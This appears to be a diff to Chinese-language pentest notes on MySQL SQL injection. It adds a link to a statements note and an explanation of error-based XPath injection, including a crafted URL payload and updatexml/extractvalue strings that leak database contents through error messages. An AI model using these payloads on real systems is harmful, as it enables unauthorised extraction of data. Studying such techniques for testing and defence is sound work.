@@ -61,6 +61,9 @@
     - [sqlmap 笔记](../../../安全工具/Sqlmap.md)
 - [TheKingOfDuck/MySQLMonitor](https://github.com/TheKingOfDuck/MySQLMonitor) - MySQL 实时监控工具(代码审计/黑盒/白盒审计辅助工具)
 
+**常用语句**
+- [Mysql常用语句](../../../../Integrated/数据库/笔记/Mysql常用语句.md)
+
 ---
 
 **SQL 注入常规利用思路**
@@ -226,11 +229,18 @@ select !(select * from (select user())x) -
 ```
 
 **xpath 函数报错注入**
+
 - **updatexml()**
+
+    updatexml 在执行时，第二个参数应该为合法的 XPATH 路径，否则会在引发报错的同时将传入的参数进行输出
+
+    构造方式 ：`http://url?id=1' or updatexml(1,concat(0x7e,(select 字段 from 表名)),1)#`
     ```sql
     updatexml(1,concat(0x3a,(select database())),1)
     ```
+
 - **extractvalue()**
+
     ```sql
     extractvalue(1,concat(0x7e,(select database()),0x7e))
     ```
